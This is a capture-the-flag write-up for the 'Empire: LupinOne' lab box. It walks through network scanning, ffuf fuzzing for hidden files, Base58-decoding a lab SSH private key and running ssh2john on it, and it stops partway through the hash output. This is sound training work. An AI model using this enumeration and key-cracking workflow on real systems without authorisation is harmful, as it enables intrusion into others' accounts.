# Empire: LupinOne Writeup

```bash
Description:
Difficulty: Medium

This box was created to be medium, but it can be hard if you get lost.

CTF like box. You have to enumerate as much as you can.

For hints discord Server ( https://discord.gg/7asvAhCEhe )

```
\

# Exploitation
Let's start with a network scan
```bash
 Currently scanning: 192.168.0.111/24   |   Screen View: Unique Hosts                                                                                                                                             
                                                                                                                                                                                                                  
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                                                                                  
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.100   40:65:d4:5e:e0:3e      1      60  Unknown vendor                                                                                                                                                 
 192.168.0.110   08:00:27:1e:f6:39      1      60  PCS Systemtechnik GmbH                                                                                                                                         
 192.168.0.101   d8:80:83:cf:7a:77      1      60  CLOUD NETWORK TECHNOLOGY SINGAPORE PTE. LTD.
```
\
Next, Finding open ports
```bash
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```
\
When we access port 80 on browser
\
<img width="1614" height="723" alt="image" src="https://github.com/user-attachments/assets/95b202a8-2290-4623-8cc9-91c5fd6c9399" />
\
Then i run dirb to check for directories
```bash
 dirb http://192.168.0.110/           

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Feb 10 04:13:49 2026
URL_BASE: http://192.168.0.110/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.0.110/ ----
==> DIRECTORY: http://192.168.0.110/image/                                                                                                                                                                        
+ http://192.168.0.110/index.html (CODE:200|SIZE:333)                                                                                                                                                             
==> DIRECTORY: http://192.168.0.110/javascript/                                                                                                                                                                   
==> DIRECTORY: http://192.168.0.110/manual/                                                                                                                                                                       
+ http://192.168.0.110/robots.txt (CODE:200|SIZE:34)                                                                                                                                                              
+ http://192.168.0.110/server-status (CODE:403|SIZE:278)
```
\
Checking robots file
\
<img width="463" height="128" alt="image" src="https://github.com/user-attachments/assets/29e47103-49e2-4885-b836-84c5a7496c21" />
\
Accessing that directory 
\
<img width="437" height="147" alt="image" src="https://github.com/user-attachments/assets/b69d9b4e-2842-4811-8957-806da8efa4da" />
\
Since the directory was like "~smtg" , i thought maybe i should use wordlist which has those , but still couldnt get any , Then i tried to append that prefix for all wordlists
```bash
 ffuf -u http://192.168.0.110/~FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -r               

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.0.110/~FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

secret                  [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 18ms]
:: Progress: [4750/4750] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```
\
Then i got '~secret'
\
<img width="844" height="208" alt="Screenshot 2026-02-10 150156" src="https://github.com/user-attachments/assets/491c4f39-4f14-4aa8-8e5f-00c72e681ebc" />
\
From this , we know that in this directory there is some file
\
So after a lot of time , i decide to add "." as a prefix to every file , since these files are not normally shown in file structure
\
So i used the command
```bash
ffuf -u http://192.168.0.110/~secret/.FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -r -e .txt,.html -fc 403 
```
\
And got
```bash
mysecret.txt            [Status: 200, Size: 4689, Words: 1, Lines: 2, Duration: 15ms]
```
\
Opening it shows some encoded data
\
<img width="1717" height="467" alt="image" src="https://github.com/user-attachments/assets/1fe90db1-3820-41ec-a0f9-a21cd91e6d5d" />
\
i thought it was base64 encoded and tried decoding , but it gave waste data, so i had to run it through this "[dcode.fr/cipher-identifier](https://www.dcode.fr/cipher-identifier)"
\
<img width="997" height="549" alt="image" src="https://github.com/user-attachments/assets/5ad1db22-db46-410e-a47c-75f9f0ce8dc6" />
\
And it strongly suggested base58 encoding , so i go to cyberchef to decode "https://gchq.github.io/CyberChef/#recipe=From_Base58('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',true)&input=Y0d4RDZLTlpRZGRZNmlDc1N1cVB6VWRxU3g0RjVvaERZbkFyVTNrdzVkbXZUVVJxY2FUcm5jSEMzTkxLQnFGTTJ5d3JOYlJUVzNlVHBVdkV6OXFGdUJueWhBSzhUV3U5Y0Z4TG9zY1dVcmM0ckxjUmFmaVZ2eFBScFA2OTJCdzVic2h1NlpacGl4ekpXdk5aaFBFb1FvSlJ4N2pVbnVwc0VoY0NnanVYRDdCTjFUTVpHTDJuVXhjRFF3YWhVQzF1Nk5MU0s4MVloOUxrTkQ2N1dEODdVZDJKcGRVd2pNb3NzU2VIRWJ2WWpDRVlCbktSUHBEaFNnTDdqbVR6eG10WnhTOXdYNkROTG1RQnNOVDkzNkw2VndZZEVQS3VMZVk2d3V5WW1mZlFZWkVWWGhEdEs2cG9rbUEzSm8yUTgzY1ZvazZ4NzRNNURBMVRkakt2RXNWR0x2Uk1ra0Rwc2h6dGlHQ2FEdTR1Y2VMdzNpTFl2TlZaSzc1azl6SzlFMnFjZHdQN3lXdWdhaENuNUh5b2Fvb0xlQkRpQ0Fvamo0SlV4YWZRVWNtZm9jdnVnem44MUdBSjhMZHhRam9zUzF0SG1yaVl0d3A4cEdmNE5mcTVGanFtR0FkdkEyWlBNVUFWV1ZIZ2tlU1ZFbm9vS1Q4c3hHVWZaeGduSEFmRVI0OW5abnoxWWdjRmtSNzNyV2ZQNU53RXBzQ2dlQ1dZU1loM1hlRjNkVXFCQnBmNnhNSm5TN3dtWmE5b1daVmQ4UnhzMXpyWGF3VktTTHhhcmRVRWZSTGg2dXNuVW1NTUFuU21UeXV2TVRuaksydnpUQmJkNWRqdmhKS2FZMnN6WEZldFpkV0JzUkZoVXdSZVVrN0RraG1DUGIybVFOb1RTdVJwbmZVRzhDV2FEM0wyUTlVSGVwdnJzNjdZR1pKV3drNTRybVQ2djFwSEhMRFI4Z0JDOVpUZmREdHpCYVpvOHNlc1BRVmJ1S0E5VkVWc2d3MXhWdlJ5Ulp6OEpINkRFenFyRW5lb2liUVVkSnhMVk5UTVhwWVhHaTY4UkE0VjFwYTV5YWoyVVE2eFJwRjZvdHJXVGVyandBTE42N3ByZVNXV0g0dlkzTUJ2OUN1NjM1OEtXZVZDMVlaQVh2QlJ3b1pQWHRxdVk5RWlGTDZpM0tYRmUzWTdXNExpN2pGOHZGcks2d29ZR3k4c29KSllFYlhRcDJOV3FhSk5jQ1FYOHVta2lHZk5GTmlSb1RmUW16Mjl3QlpGSlB0UEo5OFVrUXdLSmZTVzlYS3ZESndkdU1SV2V5Mmo2MXlhSDRpajV1WlFYRHMzN0ZOVjdUQmo3MUdHRkdFaDh2U0tQMmdnNW5MY0FDYmt6RjR6anFkaWtQM1RGTldHbmlqNWF6M0F4dmVOM0VVRm51RHRmQjRBRFJ0NTdVb2tMTURpMVY3M1B0NVBRZThnOFNManV2dE5ZcG84QXF5QzN6VE1TbVA4ZEZRZ29ib3JDWEVNSno2bnBYNlFoZ1hxcGJoUzU4eVZSaHBXMjFOejR4RmtETDhRRkNWSDJiZUwxUFp4RWdobWRWZFk5TjNwVnJNQlVTN016bllhc0NydVhxV1ZFNTVSUHVTUHJNRWNSTG9DYTFYYll0RzVKeHFmYkVnMmF3OEJkTWlyTExXaHV4Ym0zaHhycjlaaXp4RER5dTNpMVBMa3BIZ1F3M3pINEdUSzJtYjVmeHV1OVc2bkdXVzI0d2pHYnhIVzZhVG5lTHdlaDc0akZXS3pmU0xnRVZ5YzdSeUFTN1Frd2t1ZDlvenlCeHhzVjRWRWRmOG1XNWczblREeUtFNjlQMzRTa3BRZ0RWTktKdkRmSnZaYkw4bzZCZlBqRVBpMTI1ZWRWOUpiQ3lOUkZLS3BUeHBxN1FTcnVrN0w1TEVYRzhINHJzTHl2NmRqVVQ5bkpHV1FLUlBpM0J1Z2F3ZDdpeE1VWW9STWhhZ0JtR1lOYWZpNEpCYXBhY1RNd0c5NXdQeVpUOE16NmdBTHE1Vm1yOHRrazlyeTRQaDRVMkVyaWh2TmlGUVZTN1U5WEJ3UUhjNmZockRIejJvYmpkZURHdnVWSHpQZ3FNZVJNWnRqemFMQloyd0RMZUpVS0VqYUpBSG5GTHhzMXhXWFU3VjRnaWdSQXRpTUZCNWJqRlRjN293ektIY3FQOG5KclhvdThWSnFGUURNRDNQSmNMamRFclpHVVM3b2F1YWEzeGh5eDhBcjNBeWdnbnl3amp3Wjh1b1dRYm14OFN4NzF4NE55aEhaVXpIcGk4dmtFa2JLS2sxclZMTkJXSEhpNzVIaXh6QXROVFg2cG5FSkMzdDdFUGtib3VEQzJlUWQ5aTZLM0NucFpIWTNtTDd6Y2cyUEhlc1JTajZlN29aQm9NMnBTVlR3dFhSRkJQVHlGbVVhdnRpdG9BOGtGWmI0RGhZTWN4TnlMZjdyOEg5OFdidENzaGFFQmFZN2I1Q250dmdGRkV1Y0ZhbmZiejZ3OGNEeVhKbmt6ZVcxZnoxOU5pOWk2aDRCZ282QlI4RmtkNWRoZUg1VEd6NDdWRkg2aG1ZM2FVZ1V2UDhBaTJGMmpLRktnNGkzSGZDSkhHZzFDWGt0dXF6blZ1Y2pXbWRabXVBQ0EyZ2NlMnJwaUJUNkd4bU1yZlN4RENpWTMyYXh3MlFQN256RUJ2Q0ppNThyVmU4SnRkRVN0MnpIR3NVZ2EyaXlTbXVzZnBXcWpZbThrZm1xVGJZNHFBSzEzdk5NUjk1UWhYVjlWWXA5cWZmRzVZV1kxNjNXSlY1dXJZS002QkJpdUs5UWtzd0N6Z1B0anNmRkJCVW82dmZ0TnFDTmJ6UW40Tk1RbXhtMjhoRE1EVThHeWR3VW0xOW9qTm8xc2NVTXpHZk40ckx4N2JzM1M5d1lhVkxETGlOZVpkTExVMURhS1FoWjVjRlo3aXltSkhYdVpGRmdwYllaWUZpZ0xhN1Nva1hpczFMWWZiSGVYTXZjZmV1QXBtQWFHUWs2eG1hakVicGNibjFINVFRaVFwWU1YM0JScDQxdzlSVlJ1TEdaMXlMS3hQMzdvZ2NwcFN0Q3ZETUdmaXVWTVU1U1JKTWFqTFhKQnpuelJTcUJZd1dtZjRNUzZCNTd4cDU2alZrNm1hR0NzZ2pidUFoTHlDd2ZHbjFMd0xvSkRRMWtqTG1uVnJrN0ZrVVVFU3FKS2pwNWN1WDFFVXBGanNmVTFIYWliQUJ6M2ZjWVkyY1o3OHF4MmlhcVM3ZVBvNUJrd3Y1WG10Y0xFTFhiUVpLY0hjd3hrYkM1UG5FUDZFVVpSYjNucW01aE1EVVV0OTEyaGE1a01SNmc0YVZHOGJYRlU2YW41UGlrYWVkSEJSVlJDeWdrcFFqbThMaGUxY0E4WDJqdFFpVWp3dmVGNWJVTlBtdlBHazFoanVQNTZhV0VnbnlYelprS1ZQYldqN01RUTNrQWZxWjhoa0tEMVZnUThwbXFheWlhamhGSG9yZmd0Ums4WnB1RVBwSEgyNWFvSmZOTXRZNDVtSllqSE1WU1Zudkc5ZTNQSHJHd3JrczFlTFFSWGpqUm1HdFd1OWN3VDJiankyaHVXWTViN3hVU0FYWmZtUnNia1QzZUZRbkdrQUhtak1aNW5BZm1lR2hzaEN0TmpBVTRpZHU4bzdITW1NdWMzdHBLNnJlczlIVENvMzV1akszVUsyTHlNRkVLakJOY1hiaWdEV1NNMzRtWFNLSEExTTRNRjdkUGV3dlFzQWt2eFJUQ21lV3dSV3o2REtadjJNWTFleldkN21MdndHbzl0aTlTTVRYcmtyeEhROERTaHVOb3JqQ3pOQ3V4TE5HOVRocFBnV0pvRmIxc0pMMWljOVFWVHZESENKbkQxQUtkQ2p0TkhyRzk3M0JWWk5VRjZEd2JGcTVkNENUTE42anh0Q0ZzM1htb0txdXpFWTdNaUN6UmFxM2tCTkFGWU5Db1Z4UkJVM2QzYVhmTFg0clpYRURCZkFndHVta1JSbVdvd2tOanMySkRabXpTNEg4bmF3bU1hMVBZbXJyN2FORFBFVzJ3ZGJqWnVyS0FaaGhlb0VZQ3ZQOWRmcWRiTDlnUHJXZk5CSnlWQlhSRDhFWndGWk5LYjFlV1BoMXNZelViUFBoZ3J1eFdBTkNINTJnUXBmQVROcW10VEpaRmpzZnBpWExRamRCeGR6Zno3cFd2SzhqaXZoblFhaWFqVzNwd3Q0Y1p4d01mY3JySmtlMTR2TjhYYnlxZHI5ekxGalpESjduTGRtdVhUd3hQd0Q4U2VvcTJoWUVoUjk3RG5LZk1ZMkxob1dHYUhvRnF5Y1BDYVg1RkNQTmY5Q0Z0NG40bllHTGF1N2NpNXVDN1ptc3NpVDFqSFRqS3k3SjlhNHE2MTRHRkRkWlVMVGt3OFBtaDkyZnVUZEs3WjZmd2VZNGhaeUdkVVhHdFBYdmVYd0dXRVMzNmVjQ3BZWFBTUHc2cHRWYjlSeEM4MUFaRlBHbnRzODVQWVM2YUQyZVVtZ2U2S0d6Rm9wTWpZTG1hODVYNTVQdTR0Q3h5RjJGUjlFM2Myenh0cnlHNk4yb1ZUbnladDIzWXJFaEVlOWtjQ1g1OVJkaHJEcjcxWjN6Z1FrQXM4dVBNTTFKUHZNTmdkeU56cGdFR0dnajljemdCYU41UFdycFBCV2Z0ZzlmdGU0eFl5dkoxQkZONVdEdlRZZmhVdGNuMW9SVERvdzY3dzV6ejNhZGpMRG5YTFFjNk1hb3daSjJ6eWg0UEFjMXZwc3RDUnRLUXQzNUpFZHdmd1VlNHd6TnIzc2lkQ2hXOFZ1TVUxTHoxY0FqdmNWSEVwMVNhYm84RnBySndKZ1JzNVpQQTdWZTZMRFc3aEZhbmdLOFl3Wm1SQ21YeEFyQkZWd2pmVjJTanloVGpoZHFzd0pFNW5QNnBWbnNoYlY4WnFHMkw4ZDFjd2h4cHhnZ211MWpCeUVMeFZIRjFDOVQzR2dMRHZnVXY4bmM3UEVKWW9YcENveUNzNTVyMzVoOVl6ZktnamNKa3ZGVGRmUEh3VzhmU2pDVkJ1VVRLU0VBdmtScjZpTGo2SDRMRWpCZzI1Nkc0REhIcXB3VGdZRnRlamM4bkxYNzdMVW9WbUFDTHZmQzQzOWp0VmR4Q3RZQTZ5MnZqN1pEZVg3enAyVllSODlHbVNxRVdqM2RvcWRhaHYxRGt0dnRRY1JCaWl6TWdOV1lzak1XUk00QlBTY25uOTJuY0xEMUJ3NWlvQjhOeVo5Q05rTU5rNFBmN1VxYTd2Q1RndzRWSnZ2U2pFNlBSRm5xRFNyZzRhdkdVcWVNVW1uZ2M1bU42V0VhM3B4SHBraEc4Wm5nQ3FLdlZoZWdCQVZpN25EQlR3dWtxRURlQ1M0NlVjemhYTUZiQWduUVdoRXhhczU0N3ZDWGhvNzFnY21WcXUyeDVFQVBGZ0pxeXZNbVJTY1F4aUtyWW9LM3AyNzlLTEF5U000dk5jUnhyUnJSMkRZUXdoZThZak5zZjhNenFqWDU0bWhiV2NqejNqZVhva29uVms3N1A5Zzl5NjlEVnpKZVlVdmZYVkNqUFdpN2FEREE3SGRRZDJVcENnaEVHdFdTZkVKdERnUHh1clBxOHFKUWgzTjc1WUY4S2VRekpzNzdUcHdjZHYyV3V2aTFMNVpadHBwYld5bXNnWmNrV25rZzVOQjlQcDVpelZYQ2lGaG9icUYydmQyamhnNHJjcExabkdkbW1Fb3RMN0NmUmRWd1VXcFZwcEhSWnpxN0ZFUVFGeGtSTDdKekdvTDhSOHdRRzFVeUJOS1BCYlZuYzdqR3lKcUZ1anZDTHQ2eU1VRVlYS1FUaXBtRWh4NHJYSlpLM2FLZGJ1Y0toR3FNWU1IblZidHBMclFVYVBaSHNpTkdVY0VkNjRLVzVrWjdzdm9oVEM1aTRMNFR1RXpSWkV5V3k2djJHR2lFcDRNZjJvRUhNVXdxdG9OWGJzR3A4c2JKYlpBVEZMWFZiUDNQZ0J3OHJnQWFrejdRQkZBR3J5UTN0bnh5dFdOdUhXa1BvaE1NS1VpREZlUnlMaThIR1Vkb2N3WkZ6ZGtiZmZ2bzhIYWV3UFlGTnNQRENuMVB3Z1M4d0E5YWdDWDVrWmJLV0JtVTJ6cENzdHFGQXhYZVFkOExpd1p6UGRzYkYyWVpFS3pOWXRja1c1UnJGYTV6RGdLbTJnU1JOOGdIejNXcVM"

\
And then i put the decoded content into a file
```bash
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jYmMAAAAGYmNyeXB0AAAAGAAAABDy33c2Fp
PBYANne4oz3usGAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQDBzHjzJcvk
9GXiytplgT9z/mP91NqOU9QoAwop5JNxhEfm/j5KQmdj/JB7sQ1hBotONvqaAdmsK+OYL9
H6NSb0jMbMc4soFrBinoLEkx894B/PqUTODesMEV/aK22UKegdwlJ9Arf+1Y48V86gkzS6
xzoKn/ExVkApsdimIRvGhsv4ZMmMZEkTIoTEGz7raD7QHDEXiusWl0hkh33rQZCrFsZFT7
J0wKgLrX2pmoMQC6o42OQJaNLBzTxCY6jU2BDQECoVuRPL7eJa0/nRfCaOrIzPfZ/NNYgu
/Dlf1CmbXEsCVmlD71cbPqwfWKGf3hWeEr0WdQhEuTf5OyDICwUbg0dLiKz4kcskYcDzH0
ZnaDsmjoYv2uLVLi19jrfnp/tVoLbKm39ImmV6Jubj6JmpHXewewKiv6z1nNE8mkHMpY5I
he0cLdyv316bFI8O+3y5m3gPIhUUk78C5n0VUOPSQMsx56d+B9H2bFiI2lo18mTFawa0pf
XdcBVXZkouX3nlZB1/Xoip71LH3kPI7U7fPsz5EyFIPWIaENsRmznbtY9ajQhbjHAjFClA
hzXJi4LGZ6mjaGEil+9g4U7pjtEAqYv1+3x8F+zuiZsVdMr/66Ma4e6iwPLqmtzt3UiFGb
4Ie1xaWQf7UnloKUyjLvMwBbb3gRYakBbQApoONhGoYQAAB1BkuFFctACNrlDxN180vczq
mXXs+ofdFSDieiNhKCLdSqFDsSALaXkLX8DFDpFY236qQE1poC+LJsPHJYSpZOr0cGjtWp
MkMcBnzD9uynCjhZ9ijaPY/vMY7mtHZNCY8SeoWAxYXToKy2cu/+pVyGQ76KYt3J0AT7wA
2OR3aMMk0o1LoozuyvOrB3cXMHh75zBfgQyAeeD7LyYG/b7z6zGvVxZca/g572CXxXSXlb
QOw/AR8ArhAP4SJRNkFoV2YRCe38WhQEp4R6k+34tK+kUoEaVAbwU+IchYyM8ZarSvHVpE
vFUPiANSHCZ/b+pdKQtBzTk5/VH/Jk3QPcH69EJyx8/gRE/glQY6z6nC6uoG4AkIl+gOxZ
0hWJJv0R1Sgrc91mBVcYwmuUPFRB5YFMHDWbYmZ0IvcZtUxRsSk2/uWDWZcW4tDskEVPft
rqE36ftm9eJ/nWDsZoNxZbjo4cF44PTF0WU6U0UsJW6mDclDko6XSjCK4tk8vr4qQB8OLB
QMbbCOEVOOOm9ru89e1a+FCKhEPP6LfwoBGCZMkqdOqUmastvCeUmht6a1z6nXTizommZy
x+ltg9c9xfeO8tg1xasCel1BluIhUKwGDkLCeIEsD1HYDBXb+HjmHfwzRipn/tLuNPLNjG
nx9LpVd7M72Fjk6lly8KUGL7z95HAtwmSgqIRlN+M5iKlB5CVafq0z59VB8vb9oMUGkCC5
VQRfKlzvKnPk0Ae9QyPUzADy+gCuQ2HmSkJTxM6KxoZUpDCfvn08Txt0dn7CnTrFPGIcTO
cNi2xzGu3wC7jpZvkncZN+qRB0ucd6vfJ04mcT03U5oq++uyXx8t6EKESa4LXccPGNhpfh
nEcgvi6QBMBgQ1Ph0JSnUB7jjrkjqC1q8qRNuEcWHyHgtc75JwEo5ReLdV/hZBWPD8Zefm
8UytFDSagEB40Ej9jbD5GoHMPBx8VJOLhQ+4/xuaairC7s9OcX4WDZeX3E0FjP9kq3QEYH
zcixzXCpk5KnVmxPul7vNieQ2gqBjtR9BA3PqCXPeIH0OWXYE+LRnG35W6meqqQBw8gSPw
n49YlYW3wxv1G3qxqaaoG23HT3dxKcssp+XqmSALaJIzYlpnH5Cmao4eBQ4jv7qxKRhspl
AbbL2740eXtrhk3AIWiaw1h0DRXrm2GkvbvAEewx3sXEtPnMG4YVyVAFfgI37MUDrcLO93
oVb4p/rHHqqPNMNwM1ns+adF7REjzFwr4/trZq0XFkrpCe5fBYH58YyfO/g8up3DMxcSSI
63RqSbk60Z3iYiwB8iQgortZm0UsQbzLj9i1yiKQ6OekRQaEGxuiIUA1SvZoQO9NnTo0SV
y7mHzzG17nK4lMJXqTxl08q26OzvdqevMX9b3GABVaH7fsYxoXF7eDsRSx83pjrcSd+t0+
t/YYhQ/r2z30YfqwLas7ltoJotTcmPqII28JpX/nlpkEMcuXoLDzLvCZORo7AYd8JQrtg2
Ays8pHGynylFMDTn13gPJTYJhLDO4H9+7dZy825mkfKnYhPnioKUFgqJK2yswQaRPLakHU
yviNXqtxyqKc5qYQMmlF1M+fSjExEYfXbIcBhZ7gXYwalGX7uX8vk8zO5dh9W9SbO4LxlI
8nSvezGJJWBGXZAZSiLkCVp08PeKxmKN2S1TzxqoW7VOnI3jBvKD3IpQXSsbTgz5WB07BU
mUbxCXl1NYzXHPEAP95Ik8cMB8MOyFcElTD8BXJRBX2I6zHOh+4Qa4+oVk9ZluLBxeu22r
VgG7l5THcjO7L4YubiXuE2P7u77obWUfeltC8wQ0jArWi26x/IUt/FP8Nq964pD7m/dPHQ
E8/oh4V1NTGWrDsK3AbLk/MrgROSg7Ic4BS/8IwRVuC+d2w1Pq+X+zMkblEpD49IuuIazJ
BHk3s6SyWUhJfD6u4C3N8zC3Jebl6ixeVM2vEJWZ2Vhcy+31qP80O/+Kk9NUWalsz+6Kt2
yueBXN1LLFJNRVMvVO823rzVVOY2yXw8AVZKOqDRzgvBk1AHnS7r3lfHWEh5RyNhiEIKZ+
wDSuOKenqc71GfvgmVOUypYTtoI527fiF/9rS3MQH2Z3l+qWMw5A1PU2BCkMso060OIE9P
5KfF3atxbiAVii6oKfBnRhqM2s4SpWDZd8xPafktBPMgN97TzLWM6pi0NgS+fJtJPpDRL8
vTGvFCHHVi4SgTB64+HTAH53uQC5qizj5t38in3LCWtPExGV3eiKbxuMxtDGwwSLT/DKcZ
Qb50sQsJUxKkuMyfvDQC9wyhYnH0/4m9ahgaTwzQFfyf7DbTM0+sXKrlTYdMYGNZitKeqB
1bsU2HpDgh3HuudIVbtXG74nZaLPTevSrZKSAOit+Qz6M2ZAuJJ5s7UElqrLliR2FAN+gB
ECm2RqzB3Huj8mM39RitRGtIhejpsWrDkbSzVHMhTEz4tIwHgKk01BTD34ryeel/4ORlsC
iUJ66WmRUN9EoVlkeCzQJwivI=
-----END OPENSSH PRIVATE KEY-----
```
\
And give it proper permissions and use it to ssh as the user "icex64"
\
While trying to ssh , i saw that it asked password for the id_rsa file , so i realized that it was another protection and used ssh2john
```bash
ssh2john id_rsa                   
id_rsa:$sshng$2$16$f2df77361693c16003677b8a33deeb06$2486$6f70656e7373682d6b65792d7631000000000a6165733235362d636263000000066263727970740000001800000010f2df77361693c16003677b8a33deeb06000000100000000100000217000000077373682d727361000000030100010000020100c1cc78f325cbe4f465e2cada65813f73fe63fdd4da8e53d428030a29e493718447e6fe3e4a426763fc907bb10d61068b4e36fa9a01d9ac2be3982fd1fa3526f48cc6cc738b2816b0629e82c4931f3de01fcfa944ce0deb0c115fda2b6d9429e81dc2527d02b7fed58e3c57cea09334bac73a0a9ff131564029b1d8a6211bc686cbf864c98c6449132284c41b3eeb683ed01c31178aeb16974864877deb4190ab16c6454fb274c0a80bad7da99a83100baa38d8e40968d2c1cd3c4263a8d4d810d0102a15b913cbede25ad3f9d17c268eac8ccf7d9fcd35882efc395fd4299b5c4b02566943ef571b3eac1f58a19fde159e12bd16750844b937f93b20c80b051b83474b88acf891cb2461c0f31f4667683b268e862fdae2d52e2d7d8eb7e7a7fb55a0b6ca9b7f489a657a26e6e3e899a91d77b07b02a2bfacf59cd13c9a41cca58e4885ed1c2ddcafdf5e9b148f0efb7cb99b780f22151493bf02e67d1550e3d240cb31e7a77e07d1f66c5888da5a35f264c56b06b4a5f5dd701557664a2e5f79e5641d7f5e88a9ef52c7de43c8ed4edf3eccf91321483d621a10db119b39dbb58f5a8d085b8c70231429408735c98b82c667a9a368612297ef60e14ee98ed100a98bf5fb7c7c17ecee899b1574caffeba31ae1eea2c0f2ea9adceddd488519be087b5c5a5907fb527968294ca32ef33005b6f781161a9016d0029a0e3611a8610000075064b8515cb4008dae50f1375f34bdccea9975ecfa87dd1520e27a23612822dd4aa143b1200b69790b5fc0c50e9158db7eaa404d69a02f8b26c3c72584a964eaf47068ed5a932431c067cc3f6eca70a3859f628da3d8fef318ee6b4764d098f127a8580c585d3a0acb672effea55c8643be8a62ddc9d004fbc00d8e47768c324d28d4ba28ceecaf3ab07771730787be7305f810c8079e0fb2f2606fdbef3eb31af57165c6bf839ef6097c5749795b40ec3f011f00ae100fe1225136416857661109edfc5a1404a7847a93edf8b4afa452811a5406f053e21c858c8cf196ab4af1d5a44bc550f8803521c267f6fea5d290b41cd3939fd51ff264dd03dc1faf44272c7cfe0444fe095063acfa9c2eaea06e0090897e80ec59d2158926fd11d5282b73dd66055718c26b943c5441e5814c1c359b62667422f719b54c51b12936fee583599716e2d0ec90454f7edaea137e9fb66f5e27f9d60ec66837165b8e8e1c178e0f4c5d1653a53452c256ea60dc943928e974a308ae2d93cbebe2a401f0e2c140c6db08e11538e3a6f6bbbcf5ed5af8508a8443cfe8b7f0a0118264c92a74ea9499ab2dbc27949a1b7a6b5cfa9d74e2ce89a6672c7e96d83d73dc5f78ef2d835c5ab027a5d4196e22150ac060e42c278812c0f51d80c15dbf878e61dfc33462a67fed2ee34f2cd8c69f1f4ba5577b33bd858e4ea5972f0a5062fbcfde4702dc264a0a8846537e33988a941e4255a7ead33e7d541f2f6fda0c5069020b955045f2a5cef2a73e4d007bd4323d4cc00f2fa00ae4361e64a4253c4ce8ac68654a4309fbe7d3c4f1b74767ec29d3ac53c621c4ce70d8b6c731aedf00bb8e966f92771937ea91074b9c77abdf274e26713d37539a2afbebb25f1f2de8428449ae0b5dc70f18d8697e19c4720be2e9004c0604353e1d094a7501ee38eb923a82d6af2a44db847161f21e0b5cef9270128e5178b755fe164158f0fc65e7e6f14cad14349a804078d048fd8db0f91a81cc3c1c7c54938b850fb8ff1b9a6a2ac2eecf4e717e160d9797dc4d058cff64ab7404607cdc8b1cd70a99392a7566c4fba5eef362790da0a818ed47d040dcfa825cf7881f43965d813e2d19c6df95ba99eaaa401c3c8123f09f8f589585b7c31bf51b7ab1a9a6a81b6dc74f777129cb2ca7e5ea99200b689233625a671f90a66a8e1e050e23bfbab129186ca6501b6cbdbbe34797b6b864dc021689ac358740d15eb9b61a4bdbbc011ec31dec5c4b4f9cc1b8615c950057e0237ecc503adc2cef77a156f8a7fac71eaa8f34c3703359ecf9a745ed1123cc5c2be3fb6b66ad17164ae909ee5f0581f9f18c9f3bf83cba9dc3331712488eb746a49b93ad19de2622c01f22420a2bb599b452c41bccb8fd8b5ca2290e8e7a44506841b1ba22140354af66840ef4d9d3a34495cbb987cf31b5ee72b894c257a93c65d3cab6e8ecef76a7af317f5bdc600155a1fb7ec631a1717b783b114b1f37a63adc49dfadd3eb7f618850febdb3df461fab02dab3b96da09a2d4dc98fa88236f09a57fe796990431cb97a0b0f32ef099391a3b01877c250aed836032b3ca471b29f29453034e7d7780f25360984b0cee07f7eedd672f36e6691f2a76213e78a8294160a892b6cacc106913cb6a41d4caf88d5eab71caa29ce6a610326945d4cf9f4a31311187d76c8701859ee05d8c1a9465fbb97f2f93cccee5d87d5bd49b3b82f1948f274af7b31892560465d90194a22e4095a74f0f78ac6628dd92d53cf1aa85bb54e9c8de306f283dc8a505d2b1b4e0cf9581d3b0549946f1097975358cd71cf1003fde4893c70c07c30ec857049530fc057251057d88eb31ce87ee106b8fa8564f5996e2c1c5ebb6dab5601bb9794c77233bb2f862e6e25ee1363fbbbbee86d651f7a5b42f304348c0ad68b6eb1fc852dfc53fc36af7ae290fb9bf74f1d013cfe8878575353196ac3b0adc06cb93f32b81139283b21ce014bff08c1156e0be776c353eaf97fb33246e51290f8f48bae21acc9047937b3a4b25948497c3eaee02dcdf330b725e6e5ea2c5e54cdaf109599d9585ccbedf5a8ff343bff8a93d35459a96ccfee8ab76cae7815cdd4b2c524d45532f54ef36debcd554e636c97c3c01564a3aa0d1ce0bc19350079d2eebde57c758487947236188420a67ec034ae38a7a7a9cef519fbe0995394ca9613b68239dbb7e217ff6b4b73101f667797ea96330e40d4f53604290cb28d3ad0e204f4fe4a7c5ddab716e20158a2ea829f067461a8cdace12a560d977cc4f69f92d04f32037ded3ccb58cea98b43604be7c9b493e90d12fcbd31af1421c7562e1281307ae3e1d3007e77b900b9aa2ce3e6ddfc8a7dcb096b4f131195dde88a6f1b8cc6d0c6c3048b4ff0ca71941be74b10b095312a4b8cc9fbc3402f70ca16271f4ff89bd6a181a4f0cd015fc9fec36d3334fac5caae54d874c6063598ad29ea81d5bb14d87a43821dc7bae74855bb571bbe2765a2cf4debd2ad929200e8adf90cfa336640b89279b3b50496aacb96247614037e8011029b646acc1dc7ba